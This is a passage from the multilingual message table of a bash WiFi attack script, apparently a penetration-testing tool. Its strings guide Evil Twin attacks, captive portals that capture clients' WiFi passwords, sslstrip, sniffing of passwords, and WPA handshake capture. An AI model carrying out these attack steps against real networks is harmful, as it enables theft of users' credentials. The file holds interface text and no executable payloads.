	arr["FRENCH",295]="Détection de la résolution... Impossible à détecter!, utilisation de la résolution : ${normal_color}${resolution}"
	arr["CATALAN",295]="Detectant resolució... No s'ha pogut detectar!, usant estàndard : ${normal_color}${resolution}"
	arr["PORTUGUESE",295]="Detectando resolução... Não foi possível detectar!, usando o padrão : ${normal_color}${resolution}"
	arr["RUSSIAN",295]="Определение разрешения... Не получается определить!, используется стандартное : ${normal_color}${resolution}"
	arr["GREEK",295]="Εντοπίζεται η ανάλυση... Δεν μπορεί να εντοπιστεί!, χρησιμοποιείται η προεπιλεγμένη : ${normal_color}${resolution}"

	arr["ENGLISH",296]="All parameters and requirements are set. The attack is going to start. Multiple windows will be opened, don't close anyone. When you want to stop the attack press [Enter] on this window and the script will automatically close them all"
	arr["SPANISH",296]="Todos los parámetros y requerimientos están listos. Va a comenzar el ataque. Se abrirán múltiples ventanas, no cierres ninguna. Cuando quieras parar el ataque pulsa [Enter] en esta ventana y el script cerrará automaticamente todo"
	arr["FRENCH",296]="Tous les paramètres de l'attaque sont prêts et elle peut comenmcer. Plusieurs consoles vont s'ouvrir, ne les fermez pas. Lorsque vous voulez arrêter l'attaque, appuyez sur [Entrée] dans cette console et le script fermera automatiquement les autres"
	arr["CATALAN",296]="Tots els paràmetres i requeriments estan preparats. Començarà l'atac. S'obriran múltiples finestres, no tanquis cap. Quan vulguis parar l'atac prem [Enter] en aquesta finestra i el script tancarà automàticament tot"
	arr["PORTUGUESE",296]="Todos os parâmetros e requisitos estão prontos. Você vai começar o ataque. Várias janelas iram se abrir, não feche nenhuma delas. Quando quiser parar o ataque pressione [Enter] nesta janela e o script irá fechar automaticamente"
	arr["RUSSIAN",296]="Все параметры и требования готовы. Атака может быть начата. Будет открыто много окон, не закрывайте какое-либо. Когда вы захотите остановить атаку, нажмите [Enter] в этом окне и скрипт автоматически их все закроет"
	arr["GREEK",296]="Όλοι οι παράμετροι και οι απαιτήσεις έχουν τεθεί. Η επίθεση πρόκειται να ξεκινήσει. Θα ανοίξουν πολλαπλά παράθυρα, μην επιχειρήσετε να κλείσετε κάποιο. Όταν θελήσετε να σταματήσετε την επίθεση πατήστε [Enter] σε αυτό το παράθυρο και το script θα τα κλείσει όλα"

	arr["ENGLISH",297]="Cleaning iptables and routing rules"
	arr["SPANISH",297]="Limpiando iptables y reglas de routing"
	arr["FRENCH",297]="Effacement des règles de routage iptables"
	arr["CATALAN",297]="Netejant iptables i regles de routing"
	arr["PORTUGUESE",297]="Limpando iptables e regras de roteamento"
	arr["RUSSIAN",297]="Очистка iptables и правило маршрутизации"
	arr["GREEK",297]="Γινεται καθαρισμός των iptables και των κανόνων δρομολόγησης"

	arr["ENGLISH",298]="Evil Twin attack has been started. Press [Enter] key on this window to stop it"
	arr["SPANISH",298]="El ataque Evil Twin ha comenzado. Pulse la tecla [Enter] en esta ventana para pararlo"
	arr["FRENCH",298]="L'attaque Evil Twin a commencé. Pressez la touche [Entrée] dans cette console pour l'arrêter"
	arr["CATALAN",298]="L'atac Evil Twin ha començat. Prem [Enter] a aquesta finestra per aturar-lo"
	arr["PORTUGUESE",298]="Ataque Evil Twin iniciado. Pressione a tecla [Enter] nesta janela para parar"
	arr["RUSSIAN",298]="Атака Злой Двойник начата. Для её остановки клавишу [Enter] в этом окне"
	arr["GREEK",298]="Η επίθεση Evil Twin ξεκίνησε. Πατήστε το κουμπί [Enter] σε αυτό το παράθυρο για να την σταματήσετε"

	arr["ENGLISH",299]="Restoring interface..."
	arr["SPANISH",299]="Restaurando interfaz..."
	arr["FRENCH",299]="Réinitialisation de l'interface..."
	arr["CATALAN",299]="Restablint interfície..."
	arr["PORTUGUESE",299]="Restaurando interface..."
	arr["RUSSIAN",299]="Восстановление интерфейса..."
	arr["GREEK",299]="Γίνεται επαναφορά διεπαφής..."

	arr["ENGLISH",300]="If make work xpdyinfo command, the script will be able to calculate your screen resolution and show you the windows in a better way. Depending of the system, the package name could be x11-utils, xdpyinfo, xorg-xdpyinfo, etc."
	arr["SPANISH",300]="Si haces que funcione en tu sistema el comando xdpyinfo, el script podrá calcular tu resolución de pantalla y mostrarte las ventanas de forma más optimizada. Dependiendo del sistema el paquete puede llamarse x11-utils, xdpyinfo, xorg-xdpyinfo, etc."
	arr["FRENCH",300]="Si la commande xdpyinfo est installée dans vôtre système le script pourra calculer votre résolution d'écran et optimiser l'affichage en conséquence. Le paquet à installer pour avoir cette commande s'appelle (selon la distribution) x11-utils, xdpyinfo, xorg-xdpyinfo, etc."
	arr["CATALAN",300]="Si fas que funcioni en el teu sistema l'ordre xdpyinfo, el script podrà calcular la teva resolució de pantalla i mostrar-te les finestres de forma més optimitzada. Depenent del sistema el paquet pot dir-se x11-utils, xdpyinfo, xorg-xdpyinfo, etc."
	arr["PORTUGUESE",300]="Se você fizer o comando xdpyinfo o script será capaz de calcular a sua resolução de tela e mostrar-lhe as janelas de uma maneira melhor. Dependendo do sistema, o nome do pacote pode ser x11-utils, xdpyinfo, xorg-xdpyinfo, etc."
	arr["RUSSIAN",300]="Если использовать команду xpdyinfo, скрипт сможет определить разрешение вашего экрана и показать окна лучшим образом. В зависимости от системы, имя пакета может быть x11-utils, xdpyinfo, xorg-xdpyinfo, и т.д."
	arr["GREEK",300]="Αν δουλέψει η εντολή xpdyinfo, το script θα μπορέσει να υπολογίσει την ανάλυση της οθόνης και να δείχνει τα παράθυρα καλύτερα. Εξαρτάται από το σύστημα, το όνομα του πακέτου μπορεί να είναι x11-utils, xdpyinfo, xorg-xdpyinfo, κτλπ."

	arr["ENGLISH",301]="Despite having all essential tools installed, your system uses airmon-zc instead of airmon-ng. In order to work properly you need to install lspci (pciutils) and you don't have it right now. Please, install it and launch the script again"
	arr["SPANISH",301]="A pesar de tener todas las herramientas esenciales instaladas, tu sistema usa airmon-zc en lugar de airmon-ng. Para poder funcionar necesitas tener instalado lspci (pciutils) y tú no lo tienes en este momento. Por favor, instálalo y vuelve a lanzar el script"
	arr["FRENCH",301]="En dépit d'avoir tous les outils essentiels installés votre système utilise airmon-zc au lieu de airmon-ng. Vous devez installer lspci (pciutils) que vous n'avez pas à ce moment. S'il vous plaît, installez-le et relancez le script"
	arr["CATALAN",301]="Tot i tenir totes les eines essencials instal·lades, el teu sistema fa servir airmon-zc en lloc del airmon-ng. Per poder funcionar necessites tenir instal·lat lspci (pciutils) i tu no el tens en aquest moment. Si us plau, instal·la-ho i torna a executar el script"
	arr["PORTUGUESE",301]="Apesar de ter todas as ferramentas essenciais instalado, o sistema utiliza airmon-zc vez de airmon-ng. Para funcionar você precisa instalar lspci (pciutils) e você não tem neste momento. Por favor, instale e execute o script novamente"
	arr["RUSSIAN",301]="Не смотря на то, что установлены все необходимые основные инструменты, ваша система использует airmon-zc вместо airmon-ng. Чтобы работа проходила должным образом, вам нужно установить lspci (pciutils), которых в данный момент у вас нет. Пожалуйста, установите их и запустите скрипт снова"
	arr["GREEK",301]="Παρά του ότι είναι εγκατεστημένα όλα τα απραίτητα εργαλεία, το σύστημά σας χρησιμοποιεί το airmon-zc αντί το airmon-ng. Για να λειτουργήσει σωστά πρέπει να εγκαταστήσετε το lspci (pciutils) το οποίο δεν το έχετε αυτή τη στιγμή. Παρακαλώ, εγκαταστήστε το και ξανανοίξτε το script"

	arr["ENGLISH",302]="Do you want to store in a file the sniffed captured passwords? ${blue_color}If you answer no (\"n\") they will be only shown on screen ${normal_color}[y/n]"
	arr["SPANISH",302]="¿Deseas guardar en un fichero las contraseñas obtenidas del sniffing? ${blue_color}Si respondes que no (\"n\") solo se mostrarán por pantalla ${normal_color}[y/n]"
	arr["FRENCH",302]="Voulez vous garder les mots de passe capturés dans un fichier? ${blue_color}Si vous répondez non (\"n\") les mots de passe s'afficheront à l'écran ${normal_color}[y/n]"
	arr["CATALAN",302]="¿Vols guardar en un fitxer les contrasenyes obtingudes del sniffing? ${blue_color}Si respons que no (\"n\") només es mostraran per pantalla ${normal_color}[y/n]"
	arr["PORTUGUESE",302]="Você deseja armazenar em um arquivo as senhas obtidas com o sniffer? ${blue_color}Se você responder não (\"n\") só será mostrado na tela ${normal_color}[y/n]"
	arr["RUSSIAN",302]="Вы хотите сохранить в файл захваченные сниффингом пароли? ${blue_color}Если ваш ответ нет (\"n\") они будут только показаны на экране ${normal_color}[y/n]"
	arr["GREEK",302]="Θέλετε να αποθηκεύσετε σε ένα αρχείο τους sniffed κωδικούς πρόσβασης; ${blue_color}Αν απαντήσετε όχι (\"n\") απλά θα εμφανιστούν στην οθόνη ${normal_color}[y/n]"

	arr["ENGLISH",303]="Type the path to store the file or press [Enter] to accept the default proposal ${normal_color}[${default_ettercap_logpath}]"
	arr["SPANISH",303]="Escribe la ruta donde guardaremos el fichero o pulsa [Enter] para aceptar la propuesta por defecto ${normal_color}[${default_ettercap_logpath}]"
	arr["FRENCH",303]="Entrez le chemin du fichier ou bien appuyez sur [Entrée] pour utiliser le chemin proposé ${normal_color}[${default_ettercap_logpath}]"
	arr["CATALAN",303]="Escriu la ruta on desarem el fitxer o prem [Enter] per acceptar la proposta per defecte ${normal_color}[${default_ettercap_logpath}]"
	arr["PORTUGUESE",303]="Digite o caminho onde armazenar o arquivo ou pressione [Enter] para aceitar o padrão ${normal_color}[${default_ettercap_logpath}]"
	arr["RUSSIAN",303]="Напечатайте путь до файла для сохранения или нажмите [Enter] для принятия предложения по умолчанию ${normal_color}[${default_ettercap_logpath}]"
	arr["GREEK",303]="Πληκτρολογήστε το μονοπάτι για να αποθηκεύσετε το αρχείο ή πατήστε [Enter] για την προεπιλεγμένη επιλογή ${normal_color}[${default_ettercap_logpath}]"

	arr["ENGLISH",304]="Parsing sniffer log..."
	arr["SPANISH",304]="Analizando log del sniffer.."
	arr["FRENCH",304]="Analyse du log des captures..."
	arr["CATALAN",304]="Analitzant log del sniffer..."
	arr["PORTUGUESE",304]="Analizando log do Sniffer..."
	arr["RUSSIAN",304]="Разбор журнала сниффера..."
	arr["GREEK",304]="Γίνεται ανάλυση του log του sniffer..."

	arr["ENGLISH",305]="No passwords detected on sniffers's log. File will not be saved"
	arr["SPANISH",305]="No se ha encontrado ninguna contraseña en el log del sniffer. No se guardará el fichero"
	arr["FRENCH",305]="Aucun mot de passe n'a été détecté. Le fichier ne sera pas sauvegardé"
	arr["CATALAN",305]="No s'ha trobat cap contrasenya en el log del sniffer. No es guarda el fitxer"
	arr["PORTUGUESE",305]="Nenhuma senha foi encontrada no log do sniffer. Arquivo não será salvo"
	arr["RUSSIAN",305]="В журнале сниффера паролей не обнаружено. Файл не будет сохранён"
	arr["GREEK",305]="Δεν εντοπίστηκαν κωδικοί πρόσβασης στο log του sniffer. Το αρχείο δεν θα αποθηκευτεί"

	arr["ENGLISH",306]="Passwords captured by sniffer. File saved at ${normal_color}[${ettercap_logpath}]"
	arr["SPANISH",306]="El sniffer ha capturado contraseñas. Fichero salvado en ${normal_color}[${ettercap_logpath}]"
	arr["FRENCH",306]="Des mots de passe ont été capturé et ont été enregistré dans ${normal_color}[${ettercap_logpath}]"
	arr["CATALAN",306]="El sniffer ha capturat contrasenyes. Fitxer desat a ${normal_color}[${ettercap_logpath}]"
	arr["PORTUGUESE",306]="O sniffer capturou senhas. I arquivo salvo no ${normal_color}[${ettercap_logpath}]"
	arr["RUSSIAN",306]="Сниффер захватил пароли. Файл сохранён в ${normal_color}[${ettercap_logpath}]"
	arr["GREEK",306]="Καταγράφτηκαν κωδικοί πρόσβασης από τον sniffer. Το αρχείο αποθηκεύτηκε στο ${normal_color}[${ettercap_logpath}]"

	arr["ENGLISH",307]="Language changed to Russian"
	arr["SPANISH",307]="Idioma cambiado a Ruso"
	arr["FRENCH",307]="Le script sera maintenant en Russe"
	arr["CATALAN",307]="Idioma canviat a Rus"
	arr["PORTUGUESE",307]="Idioma alterado para Russo"
	arr["RUSSIAN",307]="Язык изменён на русский"
	arr["GREEK",307]="Η γλώσσα άλλαξε σε Ρωσικά"

	arr["ENGLISH",308]="6.  Russian"
	arr["SPANISH",308]="6.  Ruso"
	arr["FRENCH",308]="6.  Russe"
	arr["CATALAN",308]="6.  Rus"
	arr["PORTUGUESE",308]="6.  Russo"
	arr["RUSSIAN",308]="6.  Русский"
	arr["GREEK",308]="6.  Ρωσικά"

	arr["ENGLISH",309]="Sslstrip technique is not infallible. It depends on many factors and not always work. Some browsers such as Mozilla Firefox latest versions are not affected"
	arr["SPANISH",309]="La tecnica sslstrip no es infalible. Depende de muchos factores y no funciona siempre. Algunos navegadores como las últimas versiones de Mozilla Firefox no se ven afectados"
	arr["FRENCH",309]="La technique de sslstrip n'est pas à toute épreuve. Cela dépend de nombreux facteurs et ne fonctionne pas toujours. Certains navigateurs tels que Mozilla Firefox dans leurs versions les plus récentes ne sont pas vulnérables"
	arr["CATALAN",309]="La tècnica sslstrip no és infal·lible. Depèn de molts factors i no funciona sempre. Alguns navegadors com les últimes versions de Mozilla Firefox no es veuen afectats"
	arr["PORTUGUESE",309]="A técnica sslstrip não é infalível. Depende de muitos fatores e nem sempre funciona. Alguns navegadores como o Mozilla Firefox nas versões mais recentes não são afetados"
	arr["RUSSIAN",309]="Техника sslstrip не является надёжной. Эффект программы зависит от многих факторов и иногда она просто не работает. Некоторые браузеры, такие как Mozilla Firefox последних версий, не подвержены атаке"
	arr["GREEK",309]="Η τεχνική sslstrip δεν είναι αλάνθαστη. Εξαρτάται από πολλούς παράγοντες και δεν δουλεύει πάντα. Κάποιοι περιηγητές ιστού όπως οι τελευταίες εκδόσεις του Mozilla Firefox δεν επηρεάζονται"

	arr["ENGLISH",310]="Handshake file selected: ${pink_color}None${normal_color}"
	arr["SPANISH",310]="Fichero de Handshake seleccionado: ${pink_color}Ninguno${normal_color}"
	arr["FRENCH",310]="Fichier Handshake sélectionné: ${pink_color}Aucun${normal_color}"
	arr["CATALAN",310]="Fitxer de Handshake seleccionat: ${pink_color}Ningú${normal_color}"
	arr["PORTUGUESE",310]="Arquivo de Handshake selecionado: ${pink_color}Nenhum${normal_color}"
	arr["RUSSIAN",310]="Выбранный файл рукопожатия: ${pink_color}Отсутствует${normal_color}"
	arr["GREEK",310]="Επιλεγμένο αρχείο Χειραψίας: ${pink_color}Κανένα${normal_color}"

	arr["ENGLISH",311]="Handshake file selected: ${pink_color}${et_handshake}${normal_color}"
	arr["SPANISH",311]="Fichero de Handshake seleccionado: ${pink_color}${et_handshake}${normal_color}"
	arr["FRENCH",311]="Fichier Handshake sélectionnée: ${pink_color}${et_handshake}${normal_color}"
	arr["CATALAN",311]="Fitxer de Handshake seleccionat: ${pink_color}${et_handshake}${normal_color}"
	arr["PORTUGUESE",311]="Arquivo de Handshake selecionado: ${pink_color}${et_handshake}${normal_color}"
	arr["RUSSIAN",311]="Выбранный файл рукопожатия: ${pink_color}${et_handshake}${normal_color}"
	arr["GREEK",311]="Επιλεγμένο αρχείο Χειραψίας: ${pink_color}${et_handshake}${normal_color}"

	arr["ENGLISH",312]="No selected Handshake file detected during this session..."
	arr["SPANISH",312]="No se ha detectado ningún fichero de Handshake seleccionado en esta sesión..."
	arr["FRENCH",312]="Aucun fichier Handshake valable a été sékectionné pour cette session..."
	arr["CATALAN",312]="No s'ha detectat un fitxer de Handshake seleccionat en aquesta sessió..."
	arr["PORTUGUESE",312]="Nenhum arquivo de Handshake foi selecionado nesta sessão..."
	arr["RUSSIAN",312]="Во время этой сессии выбранный файл рукопожатия не обнаружен..."
	arr["GREEK",312]="Δεν εντοπίστηκε κανένα αρχείο Χειραψίας κατά τη διάρκεια της συνεδρίας..."

	arr["ENGLISH",313]="Handshake selected file detected during this session [${normal_color}${et_handshake}${blue_color}]"
	arr["SPANISH",313]="Se ha detectado un fichero de Handshake seleccionado en esta sesión [${normal_color}${et_handshake}${blue_color}]"
	arr["FRENCH",313]="Le fichier handshake suivant a été détecté comme étant sélectionné pour cette session [${normal_color}${et_handshake}${blue_color}]"
	arr["CATALAN",313]="S'ha detectat un fitxer de Handshake seleccionat en aquesta sessió [${normal_color}${et_handshake}${blue_color}]"
	arr["PORTUGUESE",313]="Um arquivo de Handshake foi capturado nesta sessão [${normal_color}${et_handshake}${blue_color}]"
	arr["RUSSIAN",313]="Обнаружен файл рукопожатия, выбранный в этой сессии [${normal_color}${et_handshake}${blue_color}]"
	arr["GREEK",313]="Εντοπίστηκε επιλεγμένο αρχείο Χειραψίας κατά τη διάρκεια της συνεδρίας [${normal_color}${et_handshake}${blue_color}]"

	arr["ENGLISH",314]="Handshake file selected: ${pink_color}${enteredpath}${normal_color}"
	arr["SPANISH",314]="Fichero de Handshake seleccionado: ${pink_color}${enteredpath}${normal_color}"
	arr["FRENCH",314]="Fichier Handshake sélectionné: ${pink_color}${enteredpath}${normal_color}"
	arr["CATALAN",314]="Fitxer de Handshake seleccionat: ${pink_color}${enteredpath}${normal_color}"
	arr["PORTUGUESE",314]="Arquivo Handshake selecionado: ${pink_color}${enteredpath}${normal_color}"
	arr["RUSSIAN",314]="Выбранный файл рукопожатия: ${pink_color}${enteredpath}${normal_color}"
	arr["GREEK",314]="Επιλεγμένο αρχείο Χειραψίας: ${pink_color}${enteredpath}${normal_color}"

	arr["ENGLISH",315]="This attack requires that you have previously a WPA/WPA2 network captured Handshake file"
	arr["SPANISH",315]="Este ataque requiere que tengas capturado previamente un fichero de Handshake de una red WPA/WPA2"
	arr["FRENCH",315]="Vous devez déjà avoir capturé un Handsahke WPA/WPA2 pour pouvoir lancer cette attaque"
	arr["CATALAN",315]="Aquest atac requereix que tinguis capturat prèviament un fitxer de Handshake d'una xarxa WPA/WPA2"
	arr["PORTUGUESE",315]="Este ataque requer que você já tenha capturado um arquivo Handshake de uma rede WPA/WPA2"
	arr["RUSSIAN",315]="Эта атака требует предварительного захвата файла рукопожатия для WPA/WPA2 сети"
	arr["GREEK",315]="Αυτή η επίθεση απαιτεί να έχετε προηγουμένως κατεγράψει ένα αρχείο Χειραψίας από WPA/WPA2 δίκτο"

	arr["ENGLISH",316]="An exploration looking for targets is going to be done..."
	arr["SPANISH",316]="Se va a realizar una exploración en busca de objetivos..."
	arr["FRENCH",316]="Recherche de réseaux cible..."
	arr["CATALAN",316]="Es realitzarà una exploració a la recerca d'objectius..."
	arr["PORTUGUESE",316]="Uma busca por redes wifi será realizada..."
	arr["RUSSIAN",316]="Выполнение сканирования целей..."
	arr["GREEK",316]="Πρόκειται να γίνει μία αναζήτηση για έυρεση στόχων..."

	arr["ENGLISH",317]="If the password for the wifi network is achieved with the captive portal, you must decide where to save it. ${green_color}Type the path to store the file or press [Enter] to accept the default proposal ${normal_color}[${default_et_captive_portal_logpath}]"
	arr["SPANISH",317]="Si se consigue la contraseña de la red wifi con el portal cautivo, hay que decidir donde guardarla. ${green_color}Escribe la ruta donde guardaremos el fichero o pulsa [Enter] para aceptar la propuesta por defecto ${normal_color}[${default_et_captive_portal_logpath}]"
	arr["FRENCH",317]="Si un mot de passe est capté sur le portail captif il faut lui assigner un endroit pour être enregistré. ${green_color}Entrez le chemin du fichier ou bien appuyez sur [Entrée] pour utiliser le chemin proposé ${normal_color}[${default_et_captive_portal_logpath}]"
	arr["CATALAN",317]="Si s'aconsegueix la contrasenya de la xarxa wifi amb el portal captiu, cal decidir on guardar-la. ${green_color}Escriu la ruta on desarem el fitxer o prem [Enter] per acceptar la proposta per defecte ${normal_color}[${default_et_captive_portal_logpath}]"
	arr["PORTUGUESE",317]="Se a senha da rede wifi for conseguida com o portal cativo, onde deseja salvar? ${green_color}Digite um caminho para salvar o arquivo ou pressione [Enter] para aceitar o padrão ${normal_color}[${default_et_captive_portal_logpath}]"
	arr["RUSSIAN",317]="Вы должны решить, где будет сохранён пароль wifi сети, если он будет получен Перехватывающим порталом. ${green_color}Впишите путь до файла или нажмите [Enter] для принятия значения по умолчанию ${normal_color}[${default_et_captive_portal_logpath}]"
	arr["GREEK",317]="Εάν ο κωδικός πρόσβασης του δικτύου wifi επιτευχθεί με captive portal, θα πρέπει να αποφασίσετε που θα τον αποθηκεύσετε. ${green_color}Πληκτρολογήστε το μονοπάτι για να αποθηκεύσετε το αρχείο ή πατήστε [Enter] για την προεπιλεγμένη επιλογή ${normal_color}[${default_et_captive_portal_logpath}]"

	arr["ENGLISH",318]="Choose the language in which network clients will see the captive portal :"
	arr["SPANISH",318]="Elige el idioma en el que los clientes de la red verán el portal cautivo :"
	arr["FRENCH",318]="Choisissez la langue dans laquelle les clients du réseau verront le portail captif :"
	arr["CATALAN",318]="Tria l'idioma en el qual els clients de la xarxa veuran el portal captiu :"
	arr["PORTUGUESE",318]="Escolha o idioma em que os clientes da rede irão ver o portal cativo :"
	arr["RUSSIAN",318]="Выберите язык, на котором клиенты сети будут видеть перехватывающий портал :"
	arr["GREEK",318]="Επιλέξτε τη γλώσσα που θα βλέπουν οι χρήστες του δικτύου στο captive portal :"

	arr["ENGLISH",319]="The captive portal language has been established"
	arr["SPANISH",319]="Se ha establecido el idioma del portal cautivo"
	arr["FRENCH",319]="La langue pour le portail captif est activée"
	arr["CATALAN",319]="S'ha establert l'idioma del portal captiu"
	arr["PORTUGUESE",319]="A língua foi selecionada portal cativo"
	arr["RUSSIAN",319]="Язык перехватывающего портала установлен"
	arr["GREEK",319]="Εγκαταστάθηκε η γλώσσα στο captive portal"

	arr["ENGLISH",320]="7.  Greek"
	arr["SPANISH",320]="7.  Griego"
	arr["FRENCH",320]="7.  Grec"
	arr["CATALAN",320]="7.  Grec"
	arr["PORTUGUESE",320]="7.  Grego"
	arr["RUSSIAN",320]="7.  Греческий"
	arr["GREEK",320]="7.  Ελληνικά"

	arr["ENGLISH",321]="Do you already have a captured Handshake file? ${blue_color}Answer yes (\"y\") to enter the path or answer no (\"n\") to capture a new one now ${normal_color}[y/n]"
	arr["SPANISH",321]="¿Tienes ya un fichero de Handshake capturado? ${blue_color}Responde sí (\"y\") para introducir la ruta o responde no (\"n\") para capturar uno ahora ${normal_color}[y/n]"
	arr["FRENCH",321]="Avez-vous déjà un fichier contenant un Handshake capturé? ${blue_color}Répondre oui (\"y\") pour en saisir la route o buien répondre non (\"n\") pour le capturer ${normal_color}[y/n]"
	arr["CATALAN",321]="¿Tens ja un fitxer de Handshake capturat? ${blue_color}Respon si (\"y\") per introduir la ruta o respon no (\"n\") per capturar-ne un ara ${normal_color}[y/n]"
	arr["PORTUGUESE",321]="Você já tem um arquivo Handshake capturado? ${blue_color}Responda sim (\"y\") para colocar o caminho do arquivo ou responda não (\"n\") para capturar um novo arquivo agora ${normal_color}[y/n]"
	arr["RUSSIAN",321]="У вас уже есть захваченный файл рукопожатия? ${blue_color}Ответьте Да (\"y\"), для ввода пути или ответьте Нет (\"n\"), для захвата нового рукопожатия ${normal_color}[y/n]"
	arr["GREEK",321]="Έχετε ήδη κάποιο αρχείο Χειραψίας; ${blue_color}Απαντήστε ναι (\"y\") για να εισαγάγετε το μονοπάτι ή απαντήστε όχι (\"n\") για να καταγράψετε ένα νέο τώρα ${normal_color}[y/n]"

	arr["ENGLISH",322]="It has been checked that there is a Handshake of the chosen target network while checking the selected capture file. Script can continue..."
	arr["SPANISH",322]="Se ha comprobado que existe un Handshake de la red elegida como objetivo durante la exploración en el fichero de captura seleccionado. El script puede continuar..."
	arr["FRENCH",322]="Un Handhsake du réseau cible a bien été retrouvé dans le paquet de capture préalablement choisi. Le script peut donc continuer..."
	arr["CATALAN",322]="S'ha comprovat que hi ha un Handshake de la xarxa triada com a objectiu durant l'exploració en el fitxer de captura seleccionat. El script pot continuar..."
	arr["PORTUGUESE",322]="Verificou-se que no arquivo de captura existe um Handshake da rede da selecionada como o alvo. O script pode continuar..."
	arr["RUSSIAN",322]="Проверка подтвердила, что рукопожатие относится к выбранной целевой сети. Скрипт может продолжать..."
	arr["GREEK",322]="Εντοπίστηκε η παρουσία Χειραψίας για το επιλεγμένο δίκτυο-στόχος καθώς γινόταν έλεγχος του επιλεγμένου αρχείου καταγραφής. Το script μπορεί να συνεχίσει..."

	arr["ENGLISH",323]="There is no Handshake of the selected network on the capture file"
	arr["SPANISH",323]="No se ha encontrado un Handshake de la red seleccionada en el fichero de captura"
	arr["FRENCH",323]="Aucun Handshake du réseau cible n'a été retrouvé dans le fichier de captures"
	arr["CATALAN",323]="No s'ha trobat un Handshake de la xarxa seleccionada en el fitxer de captura"
	arr["PORTUGUESE",323]="Não foi encontrado nenhum Handshake da rede selecionada no arquivo de captura"
	arr["RUSSIAN",323]="В файле захвата отсутствует рукопожатие выбранной сети"
	arr["GREEK",323]="Δεν υπάρχει Χειραψία του επιλεγμένου δικτύου στο αρχείο καταγραφής"

	arr["ENGLISH",324]="Handshake file generated successfully at [${normal_color}${et_handshake}${blue_color}]"
	arr["SPANISH",324]="Fichero de Handshake generado con éxito en [${normal_color}${et_handshake}${blue_color}]"
	arr["FRENCH",324]="Fichier Handshake généré avec succès dans [${normal_color}${et_handshake}${blue_color}]"
	arr["CATALAN",324]="Fitxer de Handshake generat amb èxit a [${normal_color}${et_handshake}${blue_color}]"
	arr["PORTUGUESE",324]="Arquivo Handshake gerado com sucesso [${normal_color}${et_handshake}${blue_color}]"
	arr["RUSSIAN",324]="Файл рукопожатия успешно создан в [${normal_color}${et_handshake}${blue_color}]"
	arr["GREEK",324]="Το αρχείο Χειραψίας δημιουργήθηκε επιτυχώς στο [${normal_color}${et_handshake}${blue_color}]"

	arr["ENGLISH",325]="Wait. Be patient..."
	arr["SPANISH",325]="Espera. Ten un poco de paciencia..."
	arr["FRENCH",325]="Ayez un peu de patience s'il vous plait..."
	arr["CATALAN",325]="Espera. Tingues una mica de paciència..."
	arr["PORTUGUESE",325]="Aguarde. Por favor, seja paciente..."
	arr["RUSSIAN",325]="Пожалуйста, подождите..."
	arr["GREEK",325]="Περιμένετε. Έχετε λίγη υπομονή..."

	arr["ENGLISH",326]="Are you going to use the interface with internet access method? ${pink_color}If the answer is no (\"n\"), you'll need ${optional_tools_names[12]} installed to continue. Both will be checked ${normal_color}[y/n]"
	arr["SPANISH",326]="¿Vas a utilizar el método de la interfaz con acceso a internet? ${pink_color}Si la respuesta es no (\"n\"), necesitarás tener instalado ${optional_tools_names[12]} para continuar. Ambas cosas se comprobarán ${normal_color}[y/n]"
	arr["FRENCH",326]="Allez-vous choisir la méthode qui emploie une interface connectée à internet? ${pink_color}Si la réponse est non (\"n\"), vous m'avez besoin de ${optional_tools_names[12]}. Une vérication se fera à ce niveau avant de lancer l'une ou l'autre méthode${normal_color}[y/n]"
	arr["CATALAN",326]="Vas a utilitzar el mètode de la interfície amb accés a internet? ${pink_color}Si la resposta és no (\"n\"), necessitaràs tenir instal·lat ${optional_tools_names[12]} per continuar. Totes dues coses es comprovaran ${normal_color}[y/n]"
	arr["PORTUGUESE",326]="Você gostaria de ultilizar uma interface com acesso à internet para o ataque? ${pink_color}Se a resposta é não (\"n\"), você precisa ter instalado ${optional_tools_names[12]} para continuar. Ambos serão verificados ${normal_color}[y/n]"
	arr["RUSSIAN",326]="Собираетесь ли вы использовать этот метод с Интернет-доступом? ${pink_color}Если ответ нет (\"п\"), то для продолжения вам нужно установить ${optional_tools_names[12]}. Будут выполнены проверки обоих условий ${normal_color}[y/n]"
	arr["GREEK",326]="Σκοπεύετε να χρησιμοποιήσετε την διεπαφή με την μέθοδο πρόσβασης στο διαδίκτυο; ${pink_color}Αν απαντήσετε όχι (\"n\"), θα πρέπει να έχετε το ${optional_tools_names[12]} εγκατεστημένο για να συνεχίσετε. Και τα δύο ελέγχονται ${normal_color}[y/n]"

	arr["ENGLISH",327]="You don't have ${optional_tools_names[12]} installed. The script can't continue. Redirecting to main screen..."
	arr["SPANISH",327]="No tienes instalado ${optional_tools_names[12]}. El script no puede continuar. Redirigiendo a la pantalla principal..."
	arr["FRENCH",327]="${optional_tools_names[12]} n'est pas installé. Le script ne peut pas continuer. Retour au menu principal..."
	arr["CATALAN",327]="No tens instal·lat ${optional_tools_names[12]}. El script no pot continuar. Redirigint a la pantalla principal..."
	arr["PORTUGUESE",327]="Você não tem ${optional_tools_names[12]} instalado . O script não pode continuar. Redirecionando para o menu principal..."
	arr["RUSSIAN",327]="У вас не установлена программа ${optional_tools_names[12]}. Скрипт не может продолжить. Переход на главный экран…"
	arr["GREEK",327]="Το ${optional_tools_names[12]} δεν είναι εγκατεστημένο. Το script δεν μπορεί να συνεχίσει. Θα καθοδηγηθείτε στην κύρια οθόνη..."

	arr["ENGLISH",328]="The unique Evil Twin attack in which it's not necessary to have an additional interface with internet access is the captive portal attack. As an alternative, you'll need another additional requirement: ${optional_tools_names[12]}"
	arr["SPANISH",328]="El único ataque de Evil Twin en el que no es necesario tener una interfaz adicional con acceso a internet es el del portal cautivo. Como alternativa necesitarás otro requerimiento adicional: ${optional_tools_names[12]}"
	arr["FRENCH",328]="La seule attaque Evil Twin pour laquelle il n'est pas nécessaire d'avoir une interface supplémentaire connectée à internet est l'attaque du portail captif. Elle implique l'utilisation d'une dépendance supplémentaire: ${optional_tools_names[12]}"
	arr["CATALAN",328]="L'únic atac d'Evil Twin en què no cal tenir una interfície addicional amb accés a internet és el del portal captiu. Com a alternativa et caldrà un altre requeriment addicional: ${optional_tools_names[12]}"
	arr["PORTUGUESE",328]="O único ataque Evil Twin em que não é necessário ter uma interface adicional com acesso à internet é o portal cativo. Porém você vai precisar ter instalado ${optional_tools_names[12]}"
	arr["RUSSIAN",328]="Уникальная атака Злой Двойник, при которой необязательно иметь дополнительный интерфейс с Интернет-доступом в атаке с Перехватывающим Порталом. В качестве альтернативы, вам нужна ещё одна дополнительная зависимость: ${optional_tools_names[12]}"
